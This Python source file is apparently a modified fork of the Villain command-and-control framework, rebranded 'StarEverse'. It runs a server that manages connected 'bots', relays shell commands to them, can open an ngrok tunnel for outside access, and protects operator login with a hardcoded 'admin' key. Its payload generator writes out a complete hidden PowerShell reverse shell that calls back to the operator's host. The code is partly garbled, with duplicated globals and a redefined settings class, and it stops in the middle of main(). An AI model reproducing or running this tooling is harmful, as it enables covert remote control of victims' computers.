#!/usr/bin/env python3
#
# Author: Panagiotis Chartas (t3l3machus) 
#
# This script is part of the "Villain C2 Framework": 
# https://github.com/t3l3machus/Villain


import argparse
import os 
import sys
import time
from subprocess import check_output
from Core.common import *
from Core.settings import Villain, Hoaxshell_Settings, Core_Server_Settings, TCP_Sock_Handler_Settings, File_Smuggler_Settings, Loading
from Core.logging import clear_metadata
from hashlib import md5
from requests import get as requests_get
from requests.exceptions import ReadTimeout
import socket
import threading
import uuid
import re
from time import sleep
from string import ascii_uppercase, ascii_lowercase, digits

# -------------- Arguments -------------- #
parser = argparse.ArgumentParser()

parser.add_argument("-p", "--port", action="store", help = "Team server port (default: 6501).", type = int)
parser.add_argument("-x", "--hoax-port", action="store", help = "HoaxShell server port (default: 8080 via http, 443 via https).", type = int)
parser.add_argument("-n", "--reverse-tcp-port", action="store", help = "Reverse TCP multi-handler port (default: 4443).", type = int)
parser.add_argument("-f", "--file-smuggler-port", action="store", help = "Http file smuggler server port (default: 8888).", type = int)
parser.add_argument("-i", "--insecure", action="store_true", help = "Allows any Villain client (sibling server) to connect to your instance without prompting you for verification.")
parser.add_argument("-c", "--certfile", action="store", help = "Path to your ssl certificate (for HoaxShell https server).")
parser.add_argument("-k", "--keyfile", action="store", help = "Path to the private key for your certificate (for HoaxShell https server).")
parser.add_argument("-u", "--update", action="store_true", help = "Try to fetch the latest commits from the main branch on GitHub.")
parser.add_argument("-v", "--version", action="store_true", help = "Show program's version number and exit.")
parser.add_argument("-q", "--quiet", action="store_true", help = "Do not print the banner on startup.")

args = parser.parse_args()

if args.version:
	print(f'v{Villain.version}')
	exit(0)

# Parse the bind ports of servers & listeners
Hoaxshell_Settings.certfile = args.certfile
Hoaxshell_Settings.keyfile = args.keyfile
Hoaxshell_Settings.ssl_support = True if (args.certfile and args.keyfile) else False
Hoaxshell_Settings.bind_port = args.hoax_port if args.hoax_port else Hoaxshell_Settings.bind_port

if Hoaxshell_Settings.ssl_support:
	Hoaxshell_Settings.bind_port_ssl = args.hoax_port if args.hoax_port else Hoaxshell_Settings.bind_port_ssl

Core_Server_Settings.bind_port = 1234  # Changed from 9001 to 1234
Core_Server_Settings.bind_address = '172.22.45.83'  # Your VM's IP
TCP_Sock_Handler_Settings.bind_port = args.reverse_tcp_port if args.reverse_tcp_port else TCP_Sock_Handler_Settings.bind_port
File_Smuggler_Settings.bind_port = args.file_smuggler_port if args.file_smuggler_port else File_Smuggler_Settings.bind_port

# Check if there are port number conflicts
defined_ports = [Core_Server_Settings.bind_port, TCP_Sock_Handler_Settings.bind_port, File_Smuggler_Settings.bind_port]

if Hoaxshell_Settings.ssl_support:
	defined_ports.append(Hoaxshell_Settings.bind_port_ssl)
else:
	defined_ports.append(Hoaxshell_Settings.bind_port)

if check_list_for_duplicates(defined_ports):
	exit(f'[{DEBUG}] The port number of each server/handler must be different.')

# Define core server security level
Core_Server_Settings.insecure = True if args.insecure else False

# Import Core	
from Core.star_core import *

# Add these at the top of the file, before any functions
admin_clients = []
if not hasattr(Sessions_Manager, 'active_sessions'):
    Sessions_Manager.active_sessions = {}

# Global variables
admin_clients = []
if not hasattr(Sessions_Manager, 'active_sessions'):
    Sessions_Manager.active_sessions = {}

# Add this near the top with other global variables
persistence_script = "Start-Process calc.exe"

def update_putty_title(num_bots):
    """Update PuTTY window title with server info, bot count, and user count"""
    title = f"{Core_Server_Settings.bind_address} - StarEverse - Bots: {len(Sessions_Manager.active_sessions)} - Users: {len(admin_clients)}"
    title_cmd = f"\x1b]0;{title}\x07"
    
    for admin in admin_clients:
        try:
            admin.send(title_cmd.encode())
        except:
            continue

class Core_Server_Settings:
    bind_port = 1234
    bind_address = '172.22.45.83'
    insecure = True

class Main_prompt:
    acsiiColor = '\033[1;38;5;82m'
    reset = '\033[0m'
    original_prompt = '\rroot@star-server:~#  '  # Added carriage return at start
    ready = True
    last_prompt_time = time()
    prompt_delay = 0.1  # 100ms delay between prompts
    
    @staticmethod
    def get_prompt():
        """Get the formatted prompt"""
        current_time = time()
        if current_time - Main_prompt.last_prompt_time >= Main_prompt.prompt_delay:
            Main_prompt.last_prompt_time = current_time
            return Main_prompt.original_prompt.encode()
        return None

# -------------- Functions & Classes -------------- #

def haxor_print(text, leading_spaces = 0):

	text_chars = list(text)
	current, mutated = '', ''

	for i in range(len(text)):
		
		original = text_chars[i]
		current += original
		mutated += f'\033[1;38;5;82m{text_chars[i].upper()}\033[0m'
		print(f'\r{" " * leading_spaces}{mutated}', end = '')
		sleep(0.05)
		print(f'\r{" " * leading_spaces}{current}', end = '')
		mutated = current

	print(f'\r{" " * leading_spaces}{text}\n')

def clear_screen():
	os.system('cls' if os.name == 'nt' else 'clear')
clear_screen()

def print_banner():
	def rgb_gradient(start_rgb, end_rgb, steps):
		r1, g1, b1 = start_rgb
		r2, g2, b2 = end_rgb
		r_step = (r2 - r1) / steps
		g_step = (g2 - g1) / steps
		b_step = (b2 - b1) / steps
		
		gradient = []
		for i in range(steps):
			r = int(r1 + (r_step * i))
			g = int(g1 + (g_step * i))
			b = int(b1 + (b_step * i))
			gradient.append(f'\033[38;2;{r};{g};{b}m')
		return gradient

	# Create gradient from pink (255,192,203) to red (255,0,0)
	lines = 7  # Number of lines in the ASCII art
	colors = rgb_gradient((255,192,203), (255,0,0), lines)
	reset = '\033[0m'
	
	ascii_lines = [
		"⠀⠀⠀⢸⣦⡀⠀⠀⠀⠀⢀⡄",
		"⠀⠀⠀⢸⣏⠻⣶⣤⡶⢾⡿⠁",
		"⠀⠀⣀⣼⠷⠀⠀⠁⢀⣿⠃⠀",
		"⠴⣾⣯⣅⣀⠀⠀⠀⠈⢻⣦⡀",
		"⠀⠀⠀⠉⢻⡇⣤⣾⣿⣷⣿⣿⡄",
		"⠀⠀⠀⠀⠸⣿⡿⠏⠀⠀⠀⠀",
		"⠀⠀⠀⠀⠀⠟⠁⠀⠀⠀⠀⠀"
	]
	
	# Apply gradient to each line
	colored_art = '\n'.join(f"{color}{line}" for color, line in zip(colors, ascii_lines))
	print(f"\n{colored_art}{reset}\n")

def print_meta():
	print("")
	

def alias_sanitizer(word, _min = 2, _max = 26):
	
	length = len(word)
	
	if length >= _min and length <= _max:
	
		valid = ascii_uppercase + ascii_lowercase + '-_' + digits
		
		for char in word:		
			if char not in valid:
				return [f'Alias includes illegal character: "{char}".']
		
		return word
				
	else:
		return ['Alias length must be between 2 to 26 characters.']


	
# Tab Auto-Completer          
class Completer(object):
	
	def __init__(self):
		
		self.tab_counter = 0		
		self.main_prompt_commands = clone_dict_keys(PrompHelp.commands)
		self.main_command_arguments = ['payload', 'lhost', 'obfuscate', 'encode', 'constraint_mode', \
		'exec_outfile', 'domain']
		self.pseudo_shell_commands = ['upload', 'cmdinspector', 'inject']
		self.payload_templates_root = os.path.dirname(os.path.abspath(__file__)) + f'{os.sep}Core{os.sep}payload_templates'
	
	
	
	def reset_counter(self):	
		sleep(0.4)
		self.tab_counter = 0
		
	
	
	def get_possible_cmds(self, cmd_frag):
		
		matches = []
		
		for cmd in self.main_prompt_commands:
			if re.match(f"^{cmd_frag}", cmd):
				matches.append(cmd)
		
		return matches
		
		
		
	def get_match_from_list(self, cmd_frag, wordlist):
		
		matches = []
		
		for w in wordlist:
			if re.match(f"^{cmd_frag}", w):
				matches.append(w)
		
		if len(matches) == 1:
			return matches[0]
		
		elif len(matches) > 1:
			
			char_count = 0
			
			while True:
				char_count += 1
				new_search_term_len = (len(cmd_frag) + char_count)
				new_word_frag = matches[0][0:new_search_term_len]
				unique = []
				
				for m in matches:
					
					if re.match(f"^{new_word_frag}", m):
						unique.append(m)		
				
				if len(unique) < len(matches):
					
					if self.tab_counter <= 1:
						return new_word_frag[0:-1]
						
					else:						
						print('\n')
						print_columns(matches)
						Main_prompt.rst_prompt() if Main_prompt.ready else sys.stdout.write('\r' + Main_prompt.hoax_prompt + global_readline.get_line_buffer())
						return False 
				
				elif len(unique) == 1:
					return False
				
				else:
					continue
					
		else:
			return False



	def find_common_prefix(self, strings):
		
		if not strings:
			return ""

		prefix = ""
		shortest_string = min(strings, key=len)

		for i, c in enumerate(shortest_string):

			if all(s[i] == c for s in strings):
				prefix += c
			else:
				break
		
		return prefix



	def path_autocompleter(self, root, search_term, hide_py_extensions = False):
			
			# Check if root or subdir
			path_level = search_term.split(os.sep)
			
			if re.search(os.sep, search_term) and len(path_level) > 1:
				search_term	= path_level[-1]
				
				for i in range(0, len(path_level)-1):
					root += f'{os.sep}{path_level[i]}'
				
			dirs = next(os.walk(root))[1]
			match = [d + os.sep for d in dirs if re.match(f'^{re.escape(search_term)}', d)]
			
			if hide_py_extensions:

				if '__pycache__/' in match:
					match.remove('__pycache__/')

			files = next(os.walk(root))[2]
			match += [f for f in files if re.match(f'^{re.escape(search_term)}', f)]
			
			# Hide extensions
			if hide_py_extensions:
			
				for i in range(0, len(match)):
					if match[i].count('.'):
						match[i] = match[i].rsplit('.', 1)[0]
					

			# Appending match substring 
			typed = len(search_term)
			
			if len(match) == 1:				
				global_readline.insert_text(match[0][typed:])				
				self.tab_counter = 0
			else:				
				common_prefix = self.find_common_prefix(match)
				global_readline.insert_text(common_prefix[typed:])
				
			# Print all matches
			if len(match) > 1 and self.tab_counter > 1:
				print('\n')	
				print_columns(match)
				self.tab_counter = 0
				Main_prompt.rst_prompt() if Main_prompt.ready else sys.stdout.write('\r' + Main_prompt.hoax_prompt + global_readline.get_line_buffer())

				


	def update_prompt(self, typed, new_content, lower = False):
		global_readline.insert_text(new_content[typed:])		
	
	
	
	def complete(self, text, state):
		
		text_cursor_position = global_readline.get_endidx()
		self.tab_counter += 1
		line_buffer_val_full = global_readline.get_line_buffer().strip()
		line_buffer_val = line_buffer_val_full[0:text_cursor_position]
		#line_buffer_remains = line_buffer_val_full[text_cursor_position:]
		line_buffer_list = re.sub(' +', ' ', line_buffer_val).split(' ')
		line_buffer_list_len = len(line_buffer_list) if line_buffer_list != [''] else 0
		
		# Return no input or input already matches a command
		if (line_buffer_list_len == 0):
			return
			
		main_cmd = line_buffer_list[0].lower()
		
		# Get prompt command from word fragment
		# print(f'{line_buffer_list_len} - {Main_prompt.ready}  - {main_cmd}')
		if line_buffer_list_len == 1:
			match = self.get_match_from_list(main_cmd, self.main_prompt_commands if Main_prompt.ready else self.pseudo_shell_commands)
			self.update_prompt(len(line_buffer_list[0]), match) if match else do_nothing()

	
		# Autocomplete session IDs
		elif ((main_cmd in ['alias', 'kill', 'shell', 'repair', 'conptyshell'] and Main_prompt.ready) or (main_cmd in self.pseudo_shell_commands and not Main_prompt.ready)) and (line_buffer_list_len > 1) and (line_buffer_list[-1][0] not in ["/", "~"]):
			
			if line_buffer_list[-1] in (Sessions_Manager.active_sessions.keys()):
				pass
			
			else:
				
				# Autofill session id if only one active session
				# if Sessions_Manager.active_sessions:

				# 	id_already_set = any(re.search(id, line_buffer_val) for id in Sessions_Manager.active_sessions.keys())

				# 	if not id_already_set:
				# 		if (main_cmd in ['kill', 'shell']):
				# 			session_id = list(Sessions_Manager.active_sessions.keys())[0]
				# 			self.update_prompt(len(line_buffer_list[-1]), session_id)

				# else:
				word_frag = line_buffer_list[-1]
				match = self.get_match_from_list(line_buffer_list[-1], list(Sessions_Manager.active_sessions.keys()) + Sessions_Manager.aliases)
				self.update_prompt(len(line_buffer_list[-1]), match) if match else do_nothing()



		# Autocomplete aliases for reset
		elif (main_cmd in ['reset']) and (line_buffer_list_len > 1) and \
			(line_buffer_list[-1][0] not in ["/", "~"]):
			
			if line_buffer_list[-1] in (Sessions_Manager.aliases):
				pass
			
			else:
				word_frag = line_buffer_list[-1]
				match = self.get_match_from_list(line_buffer_list[-1], list(Sessions_Manager.aliases))
				self.update_prompt(len(line_buffer_list[-1]), match) if match else do_nothing()



		# Autocomplete generate prompt command arguments
		elif (main_cmd == 'generate') and (line_buffer_list_len > 1):
									
			word_frag = line_buffer_list[-1].lower()
			if re.search('payload=[\\w\\/\\\\]{0,}', word_frag):
				
				tmp = word_frag.split('=')
				root = self.payload_templates_root	

				if tmp[1]:					
					search_term = tmp[1]
					self.path_autocompleter(root, search_term, hide_py_extensions = True)

				elif self.tab_counter > 1:
					contents = os.listdir(root)
					directories = [f'{entry}/' for entry in contents if os.path.isdir(os.path.join(root, entry))]
					print('\n')	
					print_columns(directories)
					self.tab_counter = 0
					Main_prompt.rst_prompt() if Main_prompt.ready else sys.stdout.write('\r' + Main_prompt.hoax_prompt + global_readline.get_line_buffer())

			else:
				match = self.get_match_from_list(line_buffer_list[-1], self.main_command_arguments)
				self.update_prompt(len(line_buffer_list[-1]), match, lower = True) if match else do_nothing()


		# Autocomplete help
		elif (main_cmd == 'help') and (line_buffer_list_len > 1):
									
			word_frag = line_buffer_list[-1].lower()
			match = self.get_match_from_list(line_buffer_list[-1], self.main_prompt_commands)
			self.update_prompt(len(line_buffer_list[-1]), match, lower = True) if match else do_nothing()

		
		# Autocomplete paths
		
		elif (main_cmd in ['inject', 'upload']) and (line_buffer_list_len > 1) and (line_buffer_list[-1][0] in [os.sep, "~"]):
			
			root = os.sep if (line_buffer_list[-1][0] == os.sep) else os.path.expanduser('~')
			search_term = line_buffer_list[-1] if (line_buffer_list[-1][0] != '~') else line_buffer_list[-1].replace('~', os.sep)
			self.path_autocompleter(root, search_term)
			
		# Reset tab counter after 0.5s of inactivity
		Thread(name="reset_counter", target=self.reset_counter).start()
		return


	
def setup_ngrok_tunnel():
    """Setup ngrok tunnel for external access"""
    try:
        # Install ngrok if not already installed
        os.system("pip install pyngrok")
        from pyngrok import ngrok, conf
        
        # Setup tunnel
        tcp_tunnel = ngrok.connect(4444, "tcp")
        tunnel_url = tcp_tunnel.public_url.replace("tcp://", "")
        host, port = tunnel_url.split(":")
        
        print(f"[+] Ngrok tunnel established:")
        print(f"    Host: {host}")
        print(f"    Port: {port}")
        return host, port
        
    except Exception as e:
        print(f"[!] Error setting up ngrok tunnel: {e}")
        return None, None

def generate_payload(args, client_socket):
    """Generate reverse shell payload with tunneling support"""
    try:
        args_dict = dict(arg.split('=', 1) for arg in args.split() if '=' in arg)
        
        if 'payload' not in args_dict:
            client_socket.send("Usage: generate payload=<type> [use_tunnel=true]\r\n".encode())
            return

        # Check if tunneling is requested
        use_tunnel = args_dict.get('use_tunnel', '').lower() == 'true'
        
        if use_tunnel:
            host, port = setup_ngrok_tunnel()
            if not host:
                client_socket.send("Error: Failed to setup tunnel\r\n".encode())
                return
        else:
            host = Core_Server_Settings.bind_address
            port = '4444'

        if args_dict['payload'] == 'windows/reverse_tcp/powershell':
            payload = f"Start-Process $PSHOME\\powershell.exe -ArgumentList {{$client = New-Object System.Net.Sockets.TCPClient('{host}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()}} -WindowStyle Hidden"
            
            client_socket.send(f"{payload}\r\n".encode())
            if use_tunnel:
                client_socket.send(f"\r\nTunnel Info:\r\nHost: {host}\r\nPort: {port}\r\n".encode())
            
        else:
            client_socket.send("Invalid payload type\r\n".encode())
            
    except Exception as e:
        client_socket.send(f"Error generating payload: {str(e)}\r\n".encode())

def handle_shell_session(client_socket, bot_id):
    """Handle shell session with a connected bot"""
    try:
        if bot_id not in Sessions_Manager.active_sessions:
            client_socket.send(f"Error: Bot ID {bot_id} not found\r\n".encode())
            return

        bot_socket = Sessions_Manager.active_sessions[bot_id]['socket']
        client_socket.send(f"\r\nStarting shell session with bot {bot_id}...\r\n".encode())
        
        # Custom shell prompt
        shell_prompt = f"\033[31m[Bot {bot_id}]\033[0m PS > "
        client_socket.send(shell_prompt.encode())

        while True:
            try:
                cmd = process_input(client_socket)
                
                if cmd is None or cmd.lower() == 'exit':
                    client_socket.send("\r\nExiting shell session...\r\n".encode())
                    break
                    
                if not cmd:
                    client_socket.send(shell_prompt.encode())
                    continue

                # Send command to bot with keep-alive mechanism
                try:
                    # Send keep-alive packet first
                    bot_socket.send(b'\x00')  # Null byte as keep-alive
                    
                    # Send actual command
                    bot_socket.send(f"{cmd}\r\n".encode())
                    
                    # Get response with timeout
                    response = ""
                    bot_socket.settimeout(5.0)  # 5 second timeout
                    
                    while True:
                        try:
                            data = bot_socket.recv(4096).decode()
                            if not data:
                                break
                            response += data
                            if response.endswith('> '):  # PowerShell prompt
                                break
                        except socket.timeout:
                            break
                    
                    # Reset timeout
                    bot_socket.settimeout(None)
                    
                    # Send response back to admin
                    client_socket.send(f"{response}\r\n".encode())
                    client_socket.send(shell_prompt.encode())
                    
                except Exception as e:
                    client_socket.send(f"Error executing command: {str(e)}\r\n".encode())
                    client_socket.send(shell_prompt.encode())
                    # Try to reconnect or reinitialize connection here
                    try:
                        bot_socket = Sessions_Manager.active_sessions[bot_id]['socket']
                    except:
                        pass

            except Exception as e:
                client_socket.send(f"Shell session error: {str(e)}\r\n".encode())
                break

    except Exception as e:
        client_socket.send(f"Shell session error: {str(e)}\r\n".encode())

def get_command_suggestions(partial_cmd):
    """Get command suggestions based on partial input"""
    commands = [
        'help',
        'shell',
        'backdoors',
        'generate',
        'persistence',
        'clear',
        'exit'
    ]
    return [cmd for cmd in commands if cmd.startswith(partial_cmd.lower())]

def process_input(client_socket):
    """Process input from client with proper character handling"""
    buffer = ""
    while True:
        try:
            char = client_socket.recv(1)
            if not char:
                return None
                
            char = char.decode()
            
            # Handle tab completion
            if char == '\t':
                suggestions = get_command_suggestions(buffer)
                if len(suggestions) == 1:
                    # Clear current line
                    client_socket.send(b'\b' * len(buffer) + b' ' * len(buffer) + b'\b' * len(buffer))
                    # Write completed command
                    buffer = suggestions[0]
                    client_socket.send(buffer.encode())
                elif len(suggestions) > 1:
                    # Show all possible completions
                    client_socket.send(b'\r\n')
                    for suggestion in suggestions:
                        client_socket.send(f"{suggestion}\r\n".encode())
                    client_socket.send(Main_prompt.original_prompt.encode())
                    client_socket.send(buffer.encode())
                continue
            
            if char in ['\r', '\n']:
                client_socket.send(b'\r\n')
                return buffer.strip()
                
            elif char in ['\x7f', '\x08']:  # Backspace
                if buffer:
                    buffer = buffer[:-1]
                    client_socket.send(b'\b \b')
                continue
                
            elif char == '\x03':  # Ctrl+C
                return 'exit'
                
            buffer += char
            client_socket.send(char.encode())
                
        except Exception as e:
            print(f"[!] Error reading input: {e}")
            return None

def handle_login(client_socket):
    """Handle user authentication"""
    while True:  # Add loop for retry
        try:
            # Clear screen first
            client_socket.send(b'\x1b[2J\x1b[H')
            
            # License prompt
            client_socket.send("\033[1;31mlicense: \033[0m".encode())
            license_key = ""
            while True:
                try:
                    char = client_socket.recv(1)
                    if not char:
                        print("[!] Connection closed during license input")
                        return False
                        
                    char = char.decode()
                    
                    if char in ['\r', '\n']:
                        client_socket.send(b'\r\n')
                        break
                        
                    elif char in ['\x7f', '\x08']:  # Backspace
                        if license_key:
                            license_key = license_key[:-1]
                            client_socket.send(b'\b \b')
                        continue
                        
                    license_key += char
                    client_socket.send(char.encode())
                    
                except Exception as e:
                    print(f"[!] Error reading license: {e}")
                    return False
            
            # Check license
            if license_key.strip() == "admin":
                # Clear screen
                client_socket.send(b'\x1b[2J\x1b[H')
                # Success message and continue to main program
                client_socket.send(b'\r\n\033[1;32mLicense accepted!\033[0m\r\n\n')
                return True
            else:
                client_socket.send(b'\r\n\033[1;31mInvalid license key!\033[0m\r\n')
                client_socket.send(b'Press Enter to try again...\r\n')
                # Wait for Enter key
                while True:
                    char = client_socket.recv(1)
                    if char and char.decode() in ['\r', '\n']:
                        break
                continue
                
        except Exception as e:
            print(f"[!] Login error: {e}")
            return False

def handle_persistence(client_socket, bot_id):
    """Handle persistence command for a specific bot"""
    try:
        if bot_id not in Sessions_Manager.active_sessions:
            client_socket.send(f"Error: Bot ID {bot_id} not found\r\n".encode())
            return

        bot_socket = Sessions_Manager.active_sessions[bot_id]['socket']
        client_socket.send(f"\r\nExecuting calculator on bot {bot_id}...\r\n".encode())
        
        try:
            # Send the command to the bot
            bot_socket.send(f"{persistence_script}\r\n".encode())
            
            # Get response with timeout
            response = ""
            bot_socket.settimeout(5.0)
            
            while True:
                try:
                    data = bot_socket.recv(4096).decode()
                    if not data:
                        break
                    response += data
                    if response.endswith('> '):
                        break
                except socket.timeout:
                    break
            
            # Reset timeout
            bot_socket.settimeout(None)
            
            # Send response back to admin
            if response:
                client_socket.send(f"Response from bot:\r\n{response}\r\n".encode())
            client_socket.send("Command executed successfully.\r\n".encode())
            
        except Exception as e:
            client_socket.send(f"Error executing command: {str(e)}\r\n".encode())
            
    except Exception as e:
        client_socket.send(f"Command error: {str(e)}\r\n".encode())

def handle_client(client_socket):
    try:
        # Handle login first
        if not handle_login(client_socket):
            client_socket.close()
            return
            
        if client_socket not in admin_clients:
            admin_clients.append(client_socket)
            update_putty_title(len(Sessions_Manager.active_sessions))

        display_ascii_art(client_socket)
        update_putty_title(len(Sessions_Manager.active_sessions))
        
        current_time = time()
        Main_prompt.last_prompt_time = current_time
        
        while True:
            current_time = time()
            if current_time - Main_prompt.last_prompt_time >= Main_prompt.prompt_delay:
                client_socket.send(Main_prompt.get_prompt())

            cmd = process_input(client_socket)
            
            if cmd is None:
                break
            
            if not cmd:
                continue
            
            cmd = cmd.lower()
            
            if cmd == 'exit':
                break
                
            elif cmd == 'clear':
                display_ascii_art(client_socket)
                update_putty_title(len(Sessions_Manager.active_sessions))
                
            elif cmd == 'help':
                display_help(client_socket)
            
            elif cmd == 'backdoors':
                display_backdoors(client_socket)
            
            elif cmd.startswith('generate'):
                generate_payload(cmd[9:].strip(), client_socket)
                
            elif cmd.startswith('shell'):
                parts = cmd.split()
                if len(parts) != 2:
                    client_socket.send("Usage: shell <bot_id>\r\n".encode())
                else:
                    handle_shell_session(client_socket, parts[1])
                    
            elif cmd.startswith('persistence'):
                parts = cmd.split()
                if len(parts) != 2:
                    client_socket.send("Usage: persistence <bot_id>\r\n".encode())
                else:
                    handle_persistence(client_socket, parts[1])
            
            else:
                client_socket.send(f"Unknown command: {cmd}\r\n".encode())
                
    except Exception as e:
        print(f"[!] Client error: {e}")
    finally:
        if client_socket in admin_clients:
            admin_clients.remove(client_socket)
        client_socket.close()
        update_putty_title(len(Sessions_Manager.active_sessions))

def handle_reverse_connection(client_socket, addr):
    try:
        session_id = str(uuid.uuid4())[:8]
        session_info = {
            'id': session_id,
            'type': 'reverse_shell',
            'ip': addr[0],
            'status': 'connected ',
            'socket': client_socket
        }
        
        Sessions_Manager.active_sessions[session_id] = session_info
        
        # Print notification line by line to all admin clients
        notification_lines = [
            "\r\n[!] New bot connected:",
            f"ID: 		{session_id}",
            f"Type: 	reverse_shell",
            f"IP: 		{addr[0]}",
            f"Status: 	online\r\n"
        ]
        
        # Send to all admin clients
        for admin in admin_clients:
            try:
                for line in notification_lines:
                    admin.send(f"{line}\r\n".encode())
            except:
                continue
        
        print(f"[+] New reverse shell connection from {addr[0]}:{addr[1]} (ID: {session_id})")
        
    except Exception as e:
        print(f"[!] Error handling reverse connection: {e}")
        client_socket.close()

def get_gradient_colors(num_lines):
    """Generate gradient colors from pink to red"""
    if num_lines <= 1:
        return ['\033[38;2;255;0;0m']
        
    colors = []
    start_color = (255, 192, 203)  # Pink
    end_color = (255, 0, 0)      # Red
    
    for i in range(num_lines):
        ratio = i / (num_lines - 1) if num_lines > 1 else 0
        r = int(start_color[0] + (end_color[0] - start_color[0]) * ratio)
        g = int(start_color[1] + (end_color[1] - start_color[1]) * ratio)
        b = int(start_color[2] + (end_color[2] - start_color[2]) * ratio)
        colors.append(f'\033[38;2;{r};{g};{b}m')
    return colors

def display_ascii_art(client_socket):
    """Display ASCII art with gradient colors"""
    try:
        # Clear screen first
        client_socket.send(b'\x1b[2J\x1b[H')
        
        ascii_lines = [
            "                ⠀⠀⠀⢸⣦⡀⠀⠀⠀⠀⢀⡄",
            "                ⠀⠀⠀⢸⣏⠻⣶⣤⡶⢾⡿⠁",
            "                ⠀⠀⣀⣼⠷⠀⠀⠁⢀⣿⠃⠀",
            "                ⠴⣾⣯⣅⣀⠀⠀⠀⠈⢻⣦⡀",
            "                ⠀⠀⠀⠉⢻⡇⣤⣾⣿⣷⣿⣿⡄",
            "                ⠀⠀⠀⠀⠸⣿⡿⠏⠀⠀⠀⠀",
            "                ⠀⠀⠀⠀⠀⠟⠁⠀⠀⠀⠀⠀"
        ]
        
        colors = get_gradient_colors(len(ascii_lines))
        
        for color, line in zip(colors, ascii_lines):
            client_socket.send(f"{color}{line}\033[0m\r\n".encode())
        
        info_lines = [
            "",
            f"    Server started on {Core_Server_Settings.bind_address}:{Core_Server_Settings.bind_port}",
            f"    Reverse handler on {Core_Server_Settings.bind_address}:4444",
            ""
        ]
        
        for line in info_lines:
            client_socket.send(f"\033[38;2;255;0;0m{line}\033[0m\r\n".encode())
            
    except Exception as e:
        print(f"[!] Error displaying ASCII art: {e}")

def display_help(client_socket):
    """Display help menu"""
    border_color = '\033[1;31m'  # Red
    text_color = '\033[1;37m'    # White
    reset = '\033[0m'
    
    help_lines = [
        "",
        f"{border_color}┌───────────────────────────────────────────────────────────────────────────┐{reset}",
        f"{border_color}│{text_color} Command              Description                                          {border_color}│{reset}",
        f"{border_color}│{text_color} -------              -----------                                          {border_color}│{reset}",
        f"{border_color}│{text_color} help         [+]     Print this message.                                  {border_color}│{reset}",
        f"{border_color}│{text_color} connect      [+]     Connect with a sibling server.                       {border_color}│{reset}",
        f"{border_color}│{text_color} generate     [+]     Generate shell scripts.                              {border_color}│{reset}",
        f"{border_color}│{text_color} siblings             Print sibling servers data table.                    {border_color}│{reset}",
        f"{border_color}│{text_color} sessions             Print established shell sessions data table.         {border_color}│{reset}",
        f"{border_color}│{text_color} backdoors            Print established shell types data table.            {border_color}│{reset}",
        f"{border_color}│{text_color} sockets              Print Villain related running services' info.        {border_color}│{reset}",
        f"{border_color}│{text_color} redirectors  [+]     List and manage traffic redirectors.                 {border_color}│{reset}",
        f"{border_color}│{text_color} shell        [+]     Enable an interactive pseudo-shell for a session.    {border_color}│{reset}",
        f"{border_color}│{text_color} alias        [+]     Set an alias for a shell session.                    {border_color}│{reset}",
        f"{border_color}│{text_color} reset        [+]     Reset alias back to the session's unique ID.         {border_color}│{reset}",
        f"{border_color}│{text_color} kill         [+]     Terminate an established shell session.              {border_color}│{reset}",
        f"{border_color}│{text_color} conptyshell  [+]     Slap Invoke-ConPtyShell against a shell session.     {border_color}│{reset}",
        f"{border_color}│{text_color} repair       [+]     Manually correct a session's hostname/username info. {border_color}│{reset}",
        f"{border_color}│{text_color} id                   Print server's unique ID (Self).                     {border_color}│{reset}",
        f"{border_color}│{text_color} cmdinspector [+]     Turn Session Defender on/off.                        {border_color}│{reset}",
        f"{border_color}│{text_color} threads              Print information regarding active threads.          {border_color}│{reset}",
        f"{border_color}│{text_color} clear                Clear screen.                                        {border_color}│{reset}",
        f"{border_color}│{text_color} purge                Delete all stored sessions metadata.                 {border_color}│{reset}",
        f"{border_color}│{text_color} flee                 Quit without terminating active sessions.            {border_color}│{reset}",
        f"{border_color}│{text_color} exit                 Kill all sessions and quit.                          {border_color}│{reset}",
        f"{border_color}│{text_color}                                                                           {border_color}│{reset}",
        f"{border_color}│{text_color}                                                                           {border_color}│{reset}",
        f"{border_color}└───────────────────────────────────────────────────────────────────────────┘{reset}",
        ""
    ]
    
    for line in help_lines:
        client_socket.send(f"{line}\r\n".encode())

def display_backdoors(client_socket):
    """Display active bot connections"""
    try:
        header_lines = [
            "",
            "┌────────────────────────────────────────────────────────────┐",
            "│ Active Sessions                                            │",
            "├────────────────────────────────────────────────────────────┘",
            "│ ID       Type          IP Address       Status              "
        ]
        
        colors = get_gradient_colors(len(header_lines))
        
        for color, line in zip(colors, header_lines):
            client_socket.send(f"{color}{line}\033[0m\r\n".encode())

        if Sessions_Manager.active_sessions:
            session_lines = []
            for session_id, session in Sessions_Manager.active_sessions.items():
                line = f"│ {session_id:<8} {session['type']:<12} {session['ip']:<14} {session['status']:<18} "
                session_lines.append(line)
            
            session_colors = get_gradient_colors(len(session_lines))
            for color, line in zip(session_colors, session_lines):
                client_socket.send(f"{color}{line}\033[0m\r\n".encode())
        else:
            empty = "│ No active sessions                                           "
            client_socket.send(f"\033[38;2;255;0;0m{empty}\033[0m\r\n".encode())

        footer = "└─────────────────────────────────────────────────────────────"
        client_socket.send(f"\033[38;2;255;0;0m{footer}\033[0m\r\n\n".encode())
            
    except Exception as e:
        print(f"[!] Error displaying backdoors: {e}")
        client_socket.send(f"Error: {str(e)}\r\n".encode())

def main():
    try:
        # Create server socket
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((Core_Server_Settings.bind_address, Core_Server_Settings.bind_port))
        server.listen(5)
        
        # Create reverse handler socket
        reverse_handler = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        reverse_handler.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        reverse_handler.bind((Core_Server_Settings.bind_address, 4444))
        reverse_handler.listen(5)
        
        # Clear screen and display banner
        os.system('clear')
        banner = f"""
{Main_prompt.acsiiColor}                ⠀⠀⠀
Server started on {Core_Server_Settings.bind_address}:{Core_Server_Settings.bind_port}
Reverse handler on {Core_Server_Settings.bind_address}:4444
{Main_prompt.reset}
"""
        print(banner)
        print("\n[*] Waiting for connections...\n")
        
